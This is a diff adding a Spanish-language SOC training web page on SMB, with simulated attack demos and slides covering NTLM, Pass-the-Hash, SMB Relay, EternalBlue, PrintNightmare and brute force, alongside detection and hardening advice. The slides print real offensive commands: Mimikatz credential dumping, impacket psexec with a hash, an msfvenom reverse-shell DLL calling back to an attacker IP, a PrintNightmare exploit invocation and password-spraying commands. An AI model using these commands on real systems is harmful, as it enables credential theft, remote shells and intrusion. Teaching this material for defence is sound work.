@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SMB — Protocolos SOC</title>
+  <meta name="description" content="SMB: recursos compartidos, Pass-the-Hash, EternalBlue, SMB Relay, detección en SOC." />
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="../boton-dubstep.css" />
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
+  <style> :root { --proto-color: #ff4444; } </style>
+  <script>
+    (function(){
+      const t = localStorage.getItem('protocolos-soc-theme') || 'vision-ui';
+      document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script>
+</head>
+<body class="page-wrapper">
+
+  <header class="site-header">
+    <div class="container">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-icon">🛡️</span>
+        <span>Protocolos<span class="accent">SOC</span></span>
+      </a>
+      <nav class="header-nav">
+        <a href="https://github.com/xavimape/protocolos-red-soc" target="_blank" rel="noopener" data-i18n="nav.github">GitHub</a>
+      </nav>
+      <div class="ui-controls">
+        <a href="../index.html" class="back-to-hub">
+          <span class="back-arrow">←</span>
+          <span data-i18n="nav.back">Volver al Hub</span>
+        </a>
+        <select class="theme-select" id="theme-select" title="Cambiar tema"></select>
+        <button class="ctrl-btn" id="lang-toggle" title="Switch to English" onclick="i18n.toggleLang()">EN</button>
+      </div>
+    </div>
+  </header>
+
+  <div class="module-header">
+    <div class="container">
+      <div class="module-breadcrumb">
+        <a href="../index.html">Hub</a>
+        <span class="sep">›</span>
+        <span>SMB</span>
+      </div>
+      <div class="module-title-row">
+        <div class="module-number-badge">6</div>
+        <div>
+          <div class="module-title">SMB</div>
+          <div class="module-subtitle" data-i18n="smb.subtitle">Server Message Block · TCP/445 · Capa de Aplicación</div>
+        </div>
+      </div>
+      <nav class="tabs-nav">
+        <button class="tab-btn active" data-tab="demo"       onclick="SOC.switchTab('smb','demo')">       <span data-i18n="tab.demo">🧪 Demo Lab</span></button>
+        <button class="tab-btn"        data-tab="teoria"     onclick="SOC.switchTab('smb','teoria')">     <span data-i18n="tab.teoria">📖 Teoría</span></button>
+        <button class="tab-btn"        data-tab="ejercicios" onclick="SOC.switchTab('smb','ejercicios')"> <span data-i18n="tab.ejercicios">✏️ Ejercicios</span></button>
+        <button class="tab-btn"        data-tab="recursos"   onclick="SOC.switchTab('smb','recursos')">   <span data-i18n="tab.recursos">📚 Recursos</span></button>
+      </nav>
+    </div>
+  </div>
+
+  <main class="container">
+
+    <!-- ── Tab: Demo Lab ── -->
+    <div class="tab-content active" data-tab="demo">
+
+      <!-- Demo 1: SMB Session -->
+      <div class="demo-container">
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="smb.demo.session.title">Sesión SMB — Autenticación NTLM</span>
+            <span class="badge badge-info">TCP/445</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-input-group">
+              <label data-i18n="smb.demo.session.client">IP Cliente:</label>
+              <input type="text" id="smb-client" value="192.168.1.50" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="smb.demo.session.server">IP Servidor (\\SERVER):</label>
+              <input type="text" id="smb-server" value="192.168.1.10" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="smb.demo.session.share">Recurso compartido:</label>
+              <select id="smb-share">
+                <option value="SYSVOL">\\SERVER\SYSVOL (DC)</option>
+                <option value="NETLOGON">\\SERVER\NETLOGON (DC)</option>
+                <option value="C$" selected>\\SERVER\C$ (admin share)</option>
+                <option value="IPC$">\\SERVER\IPC$ (named pipes)</option>
+                <option value="files">\\SERVER\files (custom share)</option>
+              </select>
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="smb.demo.session.ver">Versión SMB:</label>
+              <select id="smb-ver">
+                <option value="1">SMBv1 (legacy, vulnerable)</option>
+                <option value="2" selected>SMBv2 (Windows Vista+)</option>
+                <option value="3" data-i18n="smb.opt1">SMBv3 (Windows 8+, cifrado)</option>
+              </select>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="smbDemo.runSession()" data-i18n="smb.demo.btn.session">▶ Simular sesión SMB</button>
+              <button class="btn btn-secondary" onclick="smbDemo.reset()" data-i18n="btn.reset">↺ Reset</button>
+            </div>
+          </div>
+        </div>
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="smb.demo.session.output">Flujo de autenticación</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-output" id="smb-output">
+              <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="smb.demo.waiting">Esperando simulación SMB...</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 2: Pass-the-Hash -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="smb.demo.pth.title">⚠️ Demo: Pass-the-Hash</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="smb.demo.pth.desc">
+          NTLM autentica con el hash de la contraseña, no con la contraseña en texto claro. El atacante que obtiene un hash NTLM puede autenticarse en cualquier servicio que use NTLM sin conocer la contraseña real.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.pth.panel">Configurar Pass-the-Hash</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.pth.user">Usuario comprometido:</label>
+                <input type="text" id="pth-user" value="jperez" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.pth.hash">Hash NTLM robado:</label>
+                <input type="text" id="pth-hash" value="aad3b435b51404eeaad3b435b51404ee" style="font-family:monospace;font-size:0.8rem;" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.pth.target">Servidor objetivo:</label>
+                <input type="text" id="pth-target" value="192.168.1.10" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="smbDemo.runPTH()" data-i18n="smb.demo.btn.pth">▶ Simular Pass-the-Hash</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.pth.result">Resultado del ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="pth-output" style="min-height:180px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="smb.demo.waiting">Esperando simulación SMB...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 3: SMB Relay -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="smb.demo.relay.title">🔁 Demo: SMB Relay (NTLM Relay)</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="smb.demo.relay.desc">
+          El atacante intercepta una autenticación NTLM en tránsito y la reenvía a otro servidor en tiempo real. No necesita crackear el hash — lo "presta" para autenticarse. Herramienta típica: Responder + ntlmrelayx.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.relay.panel">Configurar SMB Relay</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.relay.victim">Host víctima (origen):</label>
+                <input type="text" id="relay-victim" value="192.168.1.50" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.relay.attacker">IP del atacante (Responder):</label>
+                <input type="text" id="relay-attacker" value="192.168.1.99" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.relay.target">Servidor objetivo del relay:</label>
+                <input type="text" id="relay-target" value="192.168.1.10" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="smbDemo.runRelay()" data-i18n="smb.demo.btn.relay">▶ Simular SMB Relay</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.relay.result">Flujo del relay</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="relay-output" style="min-height:180px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="smb.demo.waiting">Esperando simulación SMB...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- Demo 4: EternalBlue -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="smb.demo.eternal.title">💀 Demo: EternalBlue (MS17-010)</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="smb.demo.eternal.desc">
+          EternalBlue explota un buffer overflow en SMBv1 para lograr RCE sin autenticación. Fue usado por WannaCry y NotPetya en 2017. Simulación de reconocimiento, exploit y payload.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.eternal.panel">Configurar EternalBlue</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.eternal.target">Objetivo (SMBv1):</label>
+                <input type="text" id="eternal-target" value="192.168.1.100" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.eternal.os">Sistema operativo:</label>
+                <select id="eternal-os">
+                  <option value="xp">Windows XP SP3</option>
+                  <option value="7" selected data-i18n="smb.opt2">Windows 7 SP1 (sin parche)</option>
+                  <option value="2008">Windows Server 2008 R2</option>
+                  <option value="patched" data-i18n="smb.opt3">Windows 7 SP1 (con MS17-010)</option>
+                </select>
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.eternal.payload">Payload:</label>
+                <select id="eternal-payload">
+                  <option value="meterpreter" selected>Meterpreter reverse shell</option>
+                  <option value="ransomware">Ransomware dropper (WannaCry sim.)</option>
+                  <option value="mimikatz">Mimikatz (dump credentials)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="smbDemo.runEternalBlue()" data-i18n="smb.demo.btn.eternal">▶ Simular EternalBlue</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.eternal.result">Resultado del exploit</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="eternal-output" style="min-height:200px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="smb.demo.waiting">Esperando simulación SMB...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- Demo 5: PrintNightmare -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="smb.demo.print.title">🖨️ Demo: PrintNightmare (CVE-2021-1675)</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="smb.demo.print.desc">
+          Vulnerabilidad en el Windows Print Spooler. Permite a cualquier usuario autenticado instalar drivers maliciosos y ejecutar código con privilegios SYSTEM.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.print.panel">Configurar exploit</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.print.target">IP objetivo (Windows):</label>
+                <input type="text" id="print-target" value="10.0.0.50" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.print.variant">Variante:</label>
+                <select id="print-variant">
+                  <option value="rce" selected data-i18n="smb.opt4">RCE remoto (CVE-2021-1675)</option>
+                  <option value="lpe" data-i18n="smb.opt5">LPE local (CVE-2021-34527)</option>
+                  <option value="patched" data-i18n="smb.opt6">Sistema parcheado</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="smbDemo.runPrintNightmare()" data-i18n="smb.demo.print.btn">▶ Simular PrintNightmare</button>
+                <button class="btn btn-secondary" onclick="smbDemo.resetPrint()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.print.result">Flujo del exploit</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="print-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 6: SMB Brute Force -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="smb.demo.brute.title">🔑 Demo: SMB Brute Force</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="smb.demo.brute.desc">
+          Ataque de fuerza bruta contra SMB para descubrir credenciales válidas. Riesgo de lockout de cuentas en entornos con políticas de bloqueo.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.brute.panel">Configurar ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.brute.target">IP objetivo:</label>
+                <input type="text" id="smb-brute-target" value="10.0.0.10" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="smb.demo.brute.mode">Modo:</label>
+                <select id="smb-brute-mode">
+                  <option value="user_enum" selected data-i18n="smb.opt7">Enumeración de usuarios</option>
+                  <option value="password_spray">Password Spraying</option>
+                  <option value="credential_stuffing">Credential Stuffing</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="smbDemo.runBrute()" data-i18n="smb.demo.brute.btn">▶ Simular Brute Force</button>
+                <button class="btn btn-secondary" onclick="smbDemo.resetBrute()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="smb.demo.brute.result">Resultados</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="smb-brute-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /tab demo -->
+
+    <!-- ── Tab: Teoría ── -->
+    <div class="tab-content" data-tab="teoria">
+      <div class="slides-container" id="smb-slides">
+
+        <div class="slide active">
+          <span class="slide-number">1 / 10</span>
+          <h2 data-i18n="smb.s1.title">¿Qué es SMB?</h2>
+          <p class="slide-subtitle" data-i18n="smb.s1.sub">El protocolo de recursos compartidos de Windows</p>
+          <p data-i18n="smb.s1.p1">SMB (Server Message Block) permite compartir archivos, impresoras y named pipes entre nodos de una red Windows. Es la columna vertebral de los entornos Active Directory y uno de los protocolos más atacados en entornos corporativos.</p>
+          <div class="callout">
+            <strong data-i18n="smb.s1.ports.title">Puertos y versiones:</strong>
+            <ul style="margin-top:0.5rem;">
+              <li data-i18n="smb.s1.p2"><strong>TCP/445</strong> — SMB directo (moderno, todo Windows desde 2000)</li>
+              <li data-i18n="smb.s1.p3"><strong>TCP/139</strong> — SMB sobre NetBIOS (legacy)</li>
+              <li data-i18n="smb.s1.p4"><strong>SMBv1</strong> — Windows XP/2003. Vulnerable a EternalBlue (MS17-010). Debe estar DESACTIVADO.</li>
+              <li data-i18n="smb.s1.p5"><strong>SMBv2</strong> — Windows Vista/2008+. Mejoras de rendimiento. Sin cifrado nativo.</li>
+              <li data-i18n="smb.s1.p6"><strong>SMBv3</strong> — Windows 8/2012+. Cifrado AES, compresión, multichannel.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">2 / 10</span>
+          <h2 data-i18n="smb.s2.title">Autenticación NTLM — Challenge/Response</h2>
+          <p class="slide-subtitle" data-i18n="smb.s2.sub">El mecanismo que hace posible Pass-the-Hash y SMB Relay</p>
+          <pre data-i18n="smb.pre0">
+Cliente (WORKSTATION)              Servidor (\\SERVER)
+      │                                    │
+      │──── SMB_COM_NEGOTIATE ────────────►│  "¿Qué versiones soportás?"
+      │◄─── SMB_COM_NEGOTIATE_RESPONSE ─── │
+      │                                    │
+      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_NEGOTIATE
+      │◄─── SESSION_SETUP_RESP ─────────── │  Challenge = 8 bytes random
+      │                                    │
+      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_AUTH
+      │     Response = HMAC_MD5(NTHash, Challenge)
+      │     Usuario=jperez  Dominio=CORP
+      │◄─── SESSION_SETUP_RESP ─────────── │  STATUS_SUCCESS
+      │                                    │
+      └── TREE_CONNECT → acceso al share ──┘
+
+PROBLEMA FUNDAMENTAL:
+  NTHash = MD4(contraseña)  → el servidor verifica con el HASH
+  → Si robás el hash, podés autenticarte SIN la contraseña real</pre>
+          <div class="callout warning" data-i18n="smb.s2.callout">
+            <strong>Kerberos vs NTLM:</strong> los entornos modernos usan Kerberos en dominio (con tickets que caducan). NTLM se usa como fallback cuando no hay DC accesible, en workgroups, o con IPs directas. Muchos ataques fuerzan el fallback a NTLM deliberadamente.
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">3 / 10</span>
+          <h2 data-i18n="smb.s3.title">Ataque 1: Pass-the-Hash</h2>
+          <p class="slide-subtitle" data-i18n="smb.s3.sub">Usar el hash como contraseña</p>
+          <p data-i18n="smb.s3.p1">El atacante obtiene el hash NTLM de un usuario (vía Mimikatz, secretsdump, SAM dump) y lo usa directamente para autenticarse sin necesidad de crackear la contraseña.</p>
+          <pre data-i18n="smb.pre1">
+OBTENCIÓN DEL HASH:
+  mimikatz# sekurlsa::logonpasswords
+  → NTLM: aad3b435b51404eeaad3b435b51404ee (admin local)
+
+  secretsdump.py -just-dc CORP/admin@192.168.1.1
+  → Extrae todos los hashes del DC
+
+PASS-THE-HASH con impacket:
+  smbclient.py -hashes :aad3b435b51404eeaad3b435b51404ee \
+    CORP/Administrator@192.168.1.10
+  → Acceso completo al servidor como Administrator
+
+  psexec.py -hashes :HASH CORP/Administrator@192.168.1.10 cmd.exe
+  → Shell remota via SMB (¡sin contraseña!)
+
+ALCANCE: cualquier servicio que use NTLM es vulnerable:
+  SMB, RDP (NLA desactivado), WMI, MSSQL, HTTP/NTLM, LDAP</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1550.002</strong> — Use Alternate Authentication Material: Pass-the-Hash</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">4 / 10</span>
+          <h2 data-i18n="smb.s4.title">Ataque 2: SMB Relay (NTLM Relay)</h2>
+          <p class="slide-subtitle" data-i18n="smb.s4.sub">Redirigir la autenticación en tiempo real</p>
+          <pre style="font-size:0.78rem;line-height:1.5;" data-i18n="smb.pre2">
+     VÍCTIMA                  ATACANTE                   TARGET
+  (192.168.1.50)           (Responder)               (192.168.1.10)
+        │                       │                          │
+        │─── LLMNR query ──────►│  "¿Quién es \\FS01?"    │
+        │◄── "Soy yo (Soy FS01)"│  ← envenenamiento       │
+        │                       │                          │
+        │─── SMB NEGOTIATE ────►│                          │
+        │                       │──── SMB NEGOTIATE ──────►│
+        │                       │◄─── NEGOTIATE_RESP ──────│
+        │◄── NEGOTIATE_RESP ────│                          │
+        │                       │                          │
+        │─── NTLMSSP_NEGOTIATE ►│                          │
+        │                       │──── SESSION_SETUP ──────►│
+        │                       │◄─── Challenge (8 bytes)──│
+        │◄── Challenge ─────────│                          │
+        │                       │                          │
+        │─── NTLMSSP_AUTH ─────►│  NTHash(usuario+chal)   │
+        │   (hash de víctima)   │──── NTLMSSP_AUTH ───────►│
+        │                       │◄─── STATUS_SUCCESS ──────│  ← sesión abierta!
+        │                       │                          │
+        │              ntlmrelayx sobre TARGET:            │
+        │              • secretsdump (todos los hashes)    │
+        │              • net user hacker P@ss /add         │
+        │              • net localgroup administrators...  │</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1557.001</strong> — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">5 / 10</span>
+          <h2 data-i18n="smb.s5.title">Ataque 3: EternalBlue (MS17-010)</h2>
+          <p class="slide-subtitle" data-i18n="smb.s5.sub">El exploit que derribó hospitales y empresas en 2017</p>
+          <p data-i18n="smb.s5.p1">EternalBlue es un exploit para SMBv1 desarrollado por la NSA y filtrado por Shadow Brokers en abril 2017. Permite ejecución remota de código sin autenticación. Fue usado por WannaCry y NotPetya para propagación masiva.</p>
+          <div class="callout danger">
+            <strong data-i18n="smb.s5.stats">Impacto histórico:</strong>
+            <ul style="margin-top:0.5rem;">
+              <li data-i18n="smb.s5.li1">🏥 WannaCry (mayo 2017): 230,000+ sistemas en 150 países. NHS paralizado.</li>
+              <li data-i18n="smb.s5.li2">💰 NotPetya (junio 2017): $10B+ en daños. Maersk, Merck, FedEx.</li>
+              <li data-i18n="smb.s5.li3">📦 Requiere: Windows XP/7/2003/2008 con SMBv1 habilitado y TCP/445 accesible</li>
+            </ul>
+          </div>
+          <pre style="font-size:0.8rem;">
+# Verificar si host es vulnerable (solo en pentest autorizado)
+nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24
+
+RESULTADO VULNERABLE:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers
+|     State: VULNERABLE
+|     CVE: CVE-2017-0144</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">CVE: <strong>CVE-2017-0144</strong> · MS17-010 · CVSS: 9.3 (Critical)</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">6 / 10</span>
+          <h2 data-i18n="smb.s6.title">Recursos compartidos administrativos</h2>
+          <p class="slide-subtitle" data-i18n="smb.s6.sub">Los shares que todo atacante busca primero</p>
+          <pre data-i18n="smb.pre4">
+SHARES ADMINISTRATIVOS por defecto en Windows:
+  \\SERVER\C$      → unidad C: completa (solo admins)
+  \\SERVER\D$      → unidad D: completa (solo admins)
+  \\SERVER\ADMIN$  → carpeta Windows (C:\Windows)
+  \\SERVER\IPC$    → named pipes (autenticación, RPC)
+  \\SERVER\PRINT$  → drivers de impresoras
+
+SHARES DE DOMINIO (DC):
+  \\DC\SYSVOL      → scripts de grupo, políticas GPO
+  \\DC\NETLOGON    → scripts de inicio de sesión
+
+POR QUÉ LOS ATACANTES LOS BUSCAN:
+  C$ y ADMIN$ → acceso completo al sistema de archivos
+  IPC$        → primer target para enumeración (RPC, SAM)
+  SYSVOL      → puede contener contraseñas en GPP (Group Policy Preferences)
+                CVE-2014-1812: cpassword en XML descifrable por cualquier usuario
+
+DETECCIÓN:
+  Accesos a C$ o ADMIN$ desde hosts no administrativos = IOC crítico
+  Zeek: smb_files.log + smb_cmd.log → filtrar por share=C$ o ADMIN$</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">7 / 10</span>
+          <h2 data-i18n="smb.s7.title">SMB en telemetría SOC</h2>
+          <p class="slide-subtitle" data-i18n="smb.s7.sub">Zeek smb_cmd.log + smb_files.log + Event Log 4625/4648</p>
+          <pre data-i18n="smb.pre5">
+# Zeek smb_cmd.log — comandos SMB
+ts        id.orig_h      id.resp_h    command       arg
+10:00:01  192.168.1.50   192.168.1.10  TREE_CONNECT  \\SERVER\C$
+10:00:02  192.168.1.50   192.168.1.10  NT_CREATE     \\autoexec.bat
+10:00:05  192.168.1.50   192.168.1.10  NT_CREATE     \\Windows\System32\cmd.exe
+
+# IOC: acceso a C$ + escritura de ejecutable → movimiento lateral
+→ ALERTA: lateral movement via SMB admin share
+
+# Zeek smb_files.log — transferencias de archivos
+path=\\SERVER\C$\Windows\Temp\payload.exe  action=SMB::FILE_WRITE
+→ Carga de payload via SMB
+
+# Windows Event Log 4625 — login fallido NTLM
+Account Name=  jperez
+Logon Type=  3 (network)
+Failure Reason=  Unknown username or bad password
+Source Network Address=  192.168.1.99
+→ Si hay muchos 4625 seguidos de un 4624 = probable PtH
+
+# Event 4648 — logon con credenciales explícitas
+"A logon was attempted using explicit credentials"
+Target Server Name=  192.168.1.10
+Account Name=  administrator
+→ PsExec / impacket / lateral movement</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">8 / 10</span>
+          <h2 data-i18n="smb.s8.title">Detección y mitigación</h2>
+          <p class="slide-subtitle" data-i18n="smb.s8.sub">Hardening SMB para entornos corporativos</p>
+          <ul>
+            <li>🚫 <strong data-i18n="smb.s8.m1">Deshabilitar SMBv1</strong>: <code>Set-SmbServerConfiguration -EnableSMB1Protocol $false</code></li>
+            <li>🔐 <strong data-i18n="smb.s8.m2">SMB Signing obligatorio</strong>: previene SMB relay — <code>Set-SmbServerConfiguration -RequireSecuritySignature $true</code></li>
+            <li>🛡️ <strong data-i18n="smb.s8.m3">Deshabilitar LLMNR y NBT-NS</strong>: previene envenenamiento → fuente del relay</li>
+            <li>🔒 <strong data-i18n="smb.s8.m4">Protected Users group</strong>: fuerza Kerberos, deshabilita NTLM para cuentas privilegiadas</li>
+            <li>📋 <strong data-i18n="smb.s8.m5">Credential Guard</strong>: protege hashes en memoria (previene Mimikatz)</li>
+            <li>🌐 <strong data-i18n="smb.s8.m6">Segmentación</strong>: bloquear TCP/445 entre segmentos, solo hacia file servers autorizados</li>
+            <li>📊 <strong data-i18n="smb.s8.m7">Alertar Event 4625 masivos + accesos a C$</strong>: correlación SIEM crítica</li>
+          </ul>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">9 / 10</span>
+          <h2 data-i18n="smb.s9.title">Ataque 5: PrintNightmare (CVE-2021-1675/34527)</h2>
+          <p class="slide-subtitle" data-i18n="smb.s9.sub">Windows Print Spooler — usuario normal → SYSTEM</p>
+          <p data-i18n="smb.s9.p1">PrintNightmare es una vulnerabilidad crítica en el servicio Windows Print Spooler. Cualquier usuario autenticado del dominio puede invocar RpcAddPrinterDriverEx() para instalar un driver DLL malicioso. El servicio Spooler corre como SYSTEM, por lo que la DLL obtiene privilegios máximos.</p>
+          <pre data-i18n="smb.pre6">
+VECTORES:
+  CVE-2021-1675:  RCE remoto vía SMB + RPC  (parche inicial incompleto)
+  CVE-2021-34527: LPE local + RCE remoto    (parche oficial de Microsoft)
+
+EXPLOIT (impacket + DLL maliciosa):
+  1. Verificar si Spooler está activo:
+     rpcdump.py @TARGET | grep -i spooler
+     → [*] Protocol: [MS-RPRN]: Print System Remote Protocol
+
+  2. Preparar DLL maliciosa:
+     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > evil.dll
+     python3 -m http.server 8080  # servir la DLL via SMB/HTTP
+
+  3. Explotar PrintNightmare:
+     python3 CVE-2021-1675.py 'DOMAIN/user:pass'@TARGET '\\attacker\share\evil.dll'
+     → [*] Triggering PrintNightmare
+     → [+] Printer Driver installed successfully
+
+  4. Recibir shell SYSTEM:
+     msf > handler -H 10.0.0.1 -P 4444 -p windows/x64/meterpreter/reverse_tcp
+     [*] Meterpreter session opened
+     meterpreter > getuid → Server username: NT AUTHORITY\SYSTEM
+
+VERSIONES AFECTADAS:
+  Windows 7/8.1/10/11, Windows Server 2008 R2 → 2022 (sin parchear)
+
+DETECCIÓN:
+  Evento 316: AddPrinterDriverEx con nombre de driver sospechoso
+  Evento 808: RpcAddPrinterDriver con path UNC externo (\\attacker\...)
+  Sysmon Event 7: Carga de DLL desde path de impresoras
+  SIEM: alerta en c:\windows\system32\spool\drivers con escrituras externas</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">CVSS: <strong>8.8</strong> (High) · MITRE: <strong>T1068</strong> — Exploitation for Privilege Escalation</p>
+        </div>
+
+
+        <div class="slide">
+          <span class="slide-number">10 / 10</span>
+          <h2 data-i18n="smb.s10.title">Ataque 6: SMB Brute Force</h2>
+          <p class="slide-subtitle" data-i18n="smb.s10.sub">Descubrir credenciales válidas en SMB mediante diccionario o spray</p>
+          <p data-i18n="smb.s10.p1">SMB expuesto al exterior o en redes internas puede ser blanco de ataques de fuerza bruta. La técnica de Password Spraying prueba pocas contraseñas contra muchos usuarios, evitando el lockout. Credential Stuffing usa listas de credenciales filtradas.</p>
+          <pre data-i18n="smb.pre7">
+TIPOS DE ATAQUE:
+
+1. ENUMERACIÓN DE USUARIOS (sin credenciales):
+   enum4linux -U TARGET     → lista usuarios via RPC
+   crackmapexec smb TARGET --users  → enumerar cuentas del dominio
+   impacket-lookupsid DOMAIN/user:pass@TARGET → SIDs → usuarios
+
+2. PASSWORD SPRAYING (un password, muchos usuarios):
+   Objetivo: evitar lockout (típicamente 5 intentos antes del bloqueo)
+   crackmapexec smb TARGET -u users.txt -p "Password2024!" --continue-on-success
+   Señal de éxito: "[+] DOMAIN\user:Password2024! (Pwn3d!)"
+
+3. CREDENTIAL STUFFING (listas filtradas):
+   crackmapexec smb TARGET -u creds.txt -p creds.txt --no-bruteforce
+   Usa pares usuario:contraseña de dumps (RockYou, etc.)
+
+4. BRUTE FORCE CLÁSICO (pocas cuentas, muchas contraseñas):
+   hydra -l Administrator -P rockyou.txt smb://TARGET
+   Riesgo: lockout de cuentas si hay política de bloqueo activa
+
+INDICADORES DE COMPROMISO:
+  Event 4625: Logon failed (multiple en poco tiempo)
+  Event 4771: Kerberos pre-auth failed
+  Zeek: smb_auth.log, múltiples intentos con distintos users desde misma IP
+  SIEM: >10 fallos de auth SMB por minuto desde una IP
+
+DETECCIÓN AVANZADA:
+  Account lockout threshold < 5 intentos
+  MFA para cuentas privilegiadas
+  Honeypot: cuenta "admin" con alertas en cualquier intento de login</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1110</strong> — Brute Force · <strong>T1087</strong> — Account Discovery</p>
+        </div>
+
+      </div>
+
